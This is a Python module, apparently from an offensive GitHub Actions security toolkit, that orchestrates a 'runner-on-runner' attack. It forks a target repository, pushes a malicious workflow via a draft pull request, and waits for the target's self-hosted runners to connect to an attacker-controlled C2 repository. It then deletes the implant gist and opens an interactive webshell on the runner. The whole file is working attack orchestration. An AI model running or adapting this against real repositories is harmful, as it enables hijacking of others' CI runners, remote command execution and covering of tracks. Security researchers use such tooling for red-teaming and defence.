"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

from gatox.attack.attack import Attacker
from gatox.cli.output import Output
from gatox.attack.payloads.payloads import Payloads
from .webshell_utils import WebShellUtils
from .payload_manager import PayloadManager
from .c2_controller import C2Controller
from .repository_manager import RepositoryManager


class WebShell(Attacker):
    """This class wraps implementation to create a C2 repository that can be used to
    connect a runner-on-runner (RoR).

    The steps to create a RoR C2 repository are as follows:

    * Create a repository with a shell.yml workflow that runs on workflow dispatch.
    * The workflow dispatch event will trigger the workflow to run on the runner.
    * The runner will then execute the shell commands in the workflow.

    The attacker can then use the GitHub API to trigger the workflow dispatch event
    and execute commands on the runner.

    The implantation portion will use a self-hosted registration token from the GitHub
    API.

    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload_manager = None
        self.c2_controller = None
        self.repository_manager = None

    def _initialize_components(self):
        """Initialize component managers."""
        if not self.payload_manager:
            self.payload_manager = PayloadManager(self.api, self)
        if not self.c2_controller:
            self.c2_controller = C2Controller(self.api, self.user_perms, self.timeout)
        if not self.repository_manager:
            self.repository_manager = RepositoryManager(self.api, self.timeout)

    async def setup_payload_gist_and_workflow(
        self, c2_repo, target_os, target_arch, keep_alive=False
    ):
        """Delegates to PayloadManager."""
        self._initialize_components()
        return await self.payload_manager.setup_payload_gist_and_workflow(
            c2_repo, target_os, target_arch, keep_alive
        )

    async def payload_only(
        self,
        target_os: str,
        target_arch: str,
        requested_labels: list,
        keep_alive: bool = False,
        c2_repo: str = None,
        workflow_name: str = "Testing",
        run_name: str = "Testing",
    ):
        """Generates payload gist and prints RoR workflow."""
        await self.setup_user_info()

        self._initialize_components()

        if not c2_repo:
            c2_repo = await self.payload_manager.configure_c2_repository()
            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
        else:
            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")

        _, gist_url = await self.setup_payload_gist_and_workflow(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        if not gist_url:
            Output.error("Failed to create Gist!")
            return

        ror_workflow = Payloads.create_ror_workflow(
            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
        )

        Output.info("RoR Workflow below:\n")
        print(ror_workflow)

    async def runner_on_runner(
        self,
        target_repo: str,
        target_branch: str,
        pr_title: str,
        source_branch: str,
        commit_message: str,
        target_os: str,
        target_arch: str,
        requested_labels: list,
        keep_alive: bool = False,
        yaml_name: str = "tests",
        workflow_name: str = "Testing",
        run_name: str = "Testing",
        c2_repo: str = None,
    ):
        """Performs a runner-on-runner attack using the fork pull request technique.

        This feature uses the pure git database API to perform operations.
        """
        await self.setup_user_info()
        self._initialize_components()

        if not self.user_perms:
            return False

        if not (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
            and "gist" in self.user_perms["scopes"]
        ):
            Output.error("Insufficient scopes for attacker PAT!")
            return False

        if not c2_repo:
            c2_repo = await self.payload_manager.configure_c2_repository()
            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
        else:
            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")

        # Set up target repository (fork, validate, handle conflicts)
        repo_name = await self.repository_manager.setup_target_repository(
            target_repo,
            target_branch,
            source_branch,
            self.author_name,
            self.author_email,
        )
        if not repo_name:
            return False

        gist_id, gist_url = await self.setup_payload_gist_and_workflow(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        ror_workflow = Payloads.create_ror_workflow(
            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
        )

        Output.info(
            f"Conducting an attack against {Output.bright(target_repo)} as the "
            f"user: {Output.bright(self.user_perms['user'])}!"
        )

        # Deploy workflow to the fork
        if not await self.repository_manager.deploy_workflow(
            repo_name,
            source_branch,
            ror_workflow.encode(),
            yaml_name,
            self.author_name,
            self.author_email,
        ):
            return False

        Output.info("C2 Repo and Fork Prepared for attack!")
        Output.warn(
            "The following steps perform an automated overt attack. Type 'Confirm' to continue."
        )

        user_input = input()

        if user_input.lower() != "confirm":
            Output.warn("Exiting attack!")
            return False

        Output.info("Creating draft pull request!")
        pull_url = await self.repository_manager.create_pull_request(
            repo_name, source_branch, target_repo, target_branch, pr_title
        )
        if not pull_url:
            return False

        # Get current timestamp for workflow filtering
        curr_time = WebShellUtils.get_current_timestamp()

        # Wait for workflow to be triggered
        workflow_id = await WebShellUtils.wait_for_workflow(
            self.api, target_repo, "", yaml_name, f">{curr_time}", self.timeout
        )
        if workflow_id is None:
            Output.error(
                "Failed to find the triggered workflow - actions might be disabled!"
            )
            return False

        Output.info("Closing pull request!")
        await self.repository_manager.close_pull_request(repo_name, source_branch)

        # Get workflow status
        status = await self.api.get_workflow_status(target_repo, workflow_id)
        if status == -1:
            Output.warn("Workflow requires approval!")
            Output.warn("Waiting until timeout in case of approval via other means.")
        else:
            Output.info("Polling for runners!")

        # Wait for runners to connect
        runners = await WebShellUtils.wait_for_runners(self.api, c2_repo, self.timeout)
        if runners:
            Output.info("Deleting implantation Gist.")
            await self.api.call_delete(f"/gists/{gist_id}")
            await self.c2_controller.interact_webshell(
                c2_repo, runner_name=runners[0]["name"]
            )
        else:
            return False

    async def interact_webshell(self, c2_repo: str, runner_name: str = None):
        """Delegates to C2Controller."""
        await self.setup_user_info()
        self._initialize_components()
        return await self.c2_controller.interact_webshell(c2_repo, runner_name)

    async def configure_c2_repository(self):
        """Delegates to PayloadManager."""
        self._initialize_components()
        return await self.payload_manager.configure_c2_repository()

    async def format_ror_gist(
        self,
        c2_repo: str,
        target_os: str,
        target_arch: str,
        keep_alive: bool = False,
    ):
        """Delegates to PayloadManager."""
        self._initialize_components()
        return await self.payload_manager.format_ror_gist(
            c2_repo, target_os, target_arch, keep_alive
        )

    async def issue_command(
        self,
        c2_repo,
        parameter,
        timeout=30,
        workflow_name="webshell.yml",
        runner_name="gato-ror",
        download=False,
    ):
        """Delegates to C2Controller."""
        self._initialize_components()
        return await self.c2_controller.issue_command(
            c2_repo, parameter, timeout, workflow_name, runner_name, download
        )

    async def list_runners(self, c2_repo):
        """Delegates to C2Controller."""
        self._initialize_components()
        return await self.c2_controller.list_runners(c2_repo)
